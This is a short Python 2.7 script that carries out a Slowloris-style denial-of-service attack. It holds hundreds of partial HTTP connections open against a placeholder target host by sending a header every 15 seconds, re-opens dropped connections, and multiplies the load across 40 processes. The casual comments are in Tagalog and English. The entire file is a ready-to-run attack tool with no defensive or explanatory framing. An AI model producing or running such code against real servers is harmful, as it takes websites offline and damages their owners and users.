#!/usr/bin/env python2.7

#for senpai

import socket
import random
import time
import sys
import multiprocessing
log_level = 2
#socketcount = raw_input("please enter desireb number of connections (butangi di 3000 kung ram ka laptop mo 4gig it will consume 5% of your ram when this is running :)")
def log(text, level=1):
	if log_level >= level:
		print(text)
#threadcount = int(input())
threadcount = 378
listofsockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

def request():
	t = "www.targetsite.com" #target site #TARGET SITE HERE
	#t = "192.168.1.1"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket object saying. tol ipv4 ako tapos tcp gagamitin
	s.settimeout(4) 
	s.connect((t,80))
	s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")) #header get formula from git git hub hub
	for header in regular_headers:
		s.send("{}\r\n".format(header).encode("utf-8"))
	return s
def main():
	global threadcount
	log("please wait :)") # print out please wait hahahah (wierd log) idk how to use
	socket_count = threadcount 
	#int(socketcount)
	for x in range(socket_count):
		try:
			log("creating load nr {}".format(x), level=2)
			s = request()
		except socket.error:
			break
		listofsockets.append(s)
	while True:
		log("Sending. wait for me... (count): {}".format(len(listofsockets)))
		for s in list(listofsockets):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			except socket.error:
				listofsockets.remove(s)
		for x in range(socket_count -len(listofsockets)):
			log("recreating load...  ")
			try:
				s = request()
				if s:
					listofsockets.append(s)
			except socket.error:
				break
		time.sleep(15)

def threadingftw():
	for t in range(0, 40):
		try:
			bombard = multiprocessing.Process(target=main,)
			bombard.start()
		except:
			print 'error @ threading ftw'


if __name__ == "__main__":
	threadingftw()

